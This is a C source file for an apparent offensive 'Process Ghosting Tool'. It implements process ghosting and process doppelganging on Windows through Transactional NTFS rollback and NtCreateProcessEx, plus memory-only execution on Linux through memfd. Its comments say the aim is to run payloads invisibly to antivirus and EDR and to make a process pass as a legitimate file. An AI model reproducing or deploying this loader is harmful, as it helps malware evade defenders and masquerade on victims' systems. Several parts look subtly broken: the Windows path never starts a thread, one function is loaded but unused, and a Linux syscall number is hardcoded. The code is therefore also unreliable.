/*
 * Process Ghosting Implementation
 * Advanced process creation technique to evade detection
 * Works by exploiting Windows transaction NTFS and delete-pending states
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <ktmw32.h>
#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "ntdll.lib")

// NTDLL function prototypes
typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InJob
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

// Process ghosting implementation
int ghost_process(const char* payload_path, const char* target_path) {
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = NULL;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    NTSTATUS status;
    
    printf("[*] Starting process ghosting...\n");
    
    // Load NTDLL functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    
    if (!NtCreateProcessEx || !NtCreateThreadEx || !NtCreateSection) {
        printf("[-] Failed to load NTDLL functions\n");
        return -1;
    }
    
    // Step 1: Create transaction
    hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create transaction\n");
        return -1;
    }
    printf("[+] Transaction created\n");
    
    // Step 2: Create transacted file
    hTransactedFile = CreateFileTransactedA(
        target_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create transacted file\n");
        CloseHandle(hTransaction);
        return -1;
    }
    printf("[+] Transacted file created\n");
    
    // Step 3: Write payload to transacted file
    HANDLE hPayload = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open payload\n");
        goto cleanup;
    }
    
    DWORD payloadSize = GetFileSize(hPayload, NULL);
    BYTE* payloadBuffer = (BYTE*)malloc(payloadSize);
    DWORD bytesRead, bytesWritten;
    
    if (!ReadFile(hPayload, payloadBuffer, payloadSize, &bytesRead, NULL)) {
        printf("[-] Failed to read payload\n");
        free(payloadBuffer);
        CloseHandle(hPayload);
        goto cleanup;
    }
    
    if (!WriteFile(hTransactedFile, payloadBuffer, payloadSize, &bytesWritten, NULL)) {
        printf("[-] Failed to write payload to transacted file\n");
        free(payloadBuffer);
        CloseHandle(hPayload);
        goto cleanup;
    }
    
    free(payloadBuffer);
    CloseHandle(hPayload);
    printf("[+] Payload written to transacted file\n");
    
    // Step 4: Create section from transacted file
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create section: 0x%lx\n", status);
        goto cleanup;
    }
    printf("[+] Section created from transacted file\n");
    
    // Step 5: Rollback transaction (file goes to delete-pending state)
    if (!RollbackTransaction(hTransaction)) {
        printf("[-] Failed to rollback transaction\n");
        goto cleanup;
    }
    printf("[+] Transaction rolled back - file is now ghosted\n");
    
    // Step 6: Create process from ghosted section
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        0x1, // CREATE_SUSPENDED equivalent
        hSection,
        NULL,
        NULL,
        0
    );
    
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create ghosted process: 0x%lx\n", status);
        goto cleanup;
    }
    
    DWORD pid = GetProcessId(hProcess);
    printf("[+] Ghosted process created! PID: %d\n", pid);
    printf("[+] Process has no backing file on disk - completely ghosted!\n");
    
    // The process is now running from a deleted file - invisible to most AV/EDR
    
    return 0;
    
cleanup:
    if (hSection) CloseHandle(hSection);
    if (hTransactedFile) CloseHandle(hTransactedFile);
    if (hTransaction) CloseHandle(hTransaction);
    if (hProcess) CloseHandle(hProcess);
    
    return -1;
}

#else // Linux implementation

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>

// Linux process ghosting using memfd_create and execveat
int ghost_process_linux(const char* payload_path) {
    int memfd;
    int payload_fd;
    struct stat st;
    void* payload_data;
    
    printf("[*] Starting Linux process ghosting...\n");
    
    // Create anonymous memory file
    memfd = syscall(319, "ghost", 1); // memfd_create syscall
    if (memfd < 0) {
        perror("memfd_create");
        return -1;
    }
    printf("[+] Created memory-only file descriptor\n");
    
    // Open and read payload
    payload_fd = open(payload_path, O_RDONLY);
    if (payload_fd < 0) {
        perror("open payload");
        close(memfd);
        return -1;
    }
    
    if (fstat(payload_fd, &st) < 0) {
        perror("fstat");
        close(payload_fd);
        close(memfd);
        return -1;
    }
    
    // Map payload into memory
    payload_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, payload_fd, 0);
    if (payload_data == MAP_FAILED) {
        perror("mmap");
        close(payload_fd);
        close(memfd);
        return -1;
    }
    
    // Write to memfd
    if (write(memfd, payload_data, st.st_size) != st.st_size) {
        perror("write to memfd");
        munmap(payload_data, st.st_size);
        close(payload_fd);
        close(memfd);
        return -1;
    }
    
    printf("[+] Payload loaded into memory-only file\n");
    
    // Clean up
    munmap(payload_data, st.st_size);
    close(payload_fd);
    
    // Fork and execute from memory
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - execute from memfd
        char fdpath[32];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", memfd);
        
        // Execute directly from memory - no file on disk!
        char* argv[] = {"ghost", NULL};
        execve(fdpath, argv, environ);
        
        // If we get here, exec failed
        perror("execve");
        exit(1);
    } else if (pid > 0) {
        printf("[+] Ghosted process created! PID: %d\n", pid);
        printf("[+] Process running from memory - no file on disk!\n");
        
        // Check /proc to verify
        char proc_path[256];
        snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
        
        char link[256];
        ssize_t len = readlink(proc_path, link, sizeof(link)-1);
        if (len > 0) {
            link[len] = '\0';
            printf("[*] Process executable link: %s (deleted)\n", link);
        }
    } else {
        perror("fork");
        close(memfd);
        return -1;
    }
    
    close(memfd);
    return 0;
}

int ghost_process(const char* payload_path, const char* target_path) {
    (void)target_path; // Unused on Linux
    return ghost_process_linux(payload_path);
}

#endif

// Advanced evasion: Process Doppelganging (Windows)
#ifdef _WIN32
int process_doppelgang(const char* payload_path, const char* target_path) {
    printf("[*] Process Doppelganging attack...\n");
    
    // This uses Windows Transactional NTFS (TxF) to:
    // 1. Create transaction
    // 2. Overwrite legitimate file in transaction
    // 3. Create section from transacted file
    // 4. Rollback transaction
    // 5. Create process from section
    
    // The result is a process that appears to be the legitimate file
    // but is actually running our payload
    
    HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);
    if (!hTransaction) {
        printf("[-] Failed to create transaction\n");
        return -1;
    }
    
    // Open target file transacted
    HANDLE hTarget = CreateFileTransactedA(
        target_path,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    
    if (hTarget == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open target transacted\n");
        CloseHandle(hTransaction);
        return -1;
    }
    
    // Overwrite with payload
    HANDLE hPayload = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open payload\n");
        CloseHandle(hTarget);
        CloseHandle(hTransaction);
        return -1;
    }
    
    BYTE buffer[4096];
    DWORD bytesRead, bytesWritten;
    
    SetFilePointer(hTarget, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hTarget); // Truncate target
    
    while (ReadFile(hPayload, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        WriteFile(hTarget, buffer, bytesRead, &bytesWritten, NULL);
    }
    
    CloseHandle(hPayload);
    printf("[+] Target overwritten in transaction\n");
    
    // Create section from modified file
    HANDLE hSection = NULL;
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hTarget
    );
    
    CloseHandle(hTarget);
    
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to create section\n");
        RollbackTransaction(hTransaction);
        CloseHandle(hTransaction);
        return -1;
    }
    
    // Rollback - original file is restored
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);
    printf("[+] Transaction rolled back - original file intact\n");
    
    // But our section still has the payload!
    // Create process from it
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    
    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        0,
        hSection,
        NULL,
        NULL,
        0
    );
    
    if (NT_SUCCESS(status)) {
        DWORD pid = GetProcessId(hProcess);
        printf("[+] Doppelganger process created! PID: %d\n", pid);
        printf("[+] Process appears as: %s\n", target_path);
        printf("[+] But running: %s\n", payload_path);
        CloseHandle(hProcess);
    } else {
        printf("[-] Failed to create process: 0x%lx\n", status);
    }
    
    CloseHandle(hSection);
    return 0;
}
#endif

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Process Ghosting Tool\n");
        printf("Usage: %s <payload> [target]\n", argv[0]);
        printf("\nTechniques:\n");
        printf("  - Process Ghosting: Create process from deleted file\n");
        printf("  - Process Doppelganging: Impersonate legitimate process\n");
        return 1;
    }
    
    const char* payload = argv[1];
    const char* target = (argc > 2) ? argv[2] : NULL;
    
#ifdef _WIN32
    if (target) {
        printf("[*] Using Process Doppelganging technique\n");
        return process_doppelgang(payload, target);
    } else {
        printf("[*] Using Process Ghosting technique\n");
        return ghost_process(payload, "C:\\Windows\\Temp\\ghost.exe");
    }
#else
    printf("[*] Using Linux memory-only execution\n");
    return ghost_process(payload, NULL);
#endif
}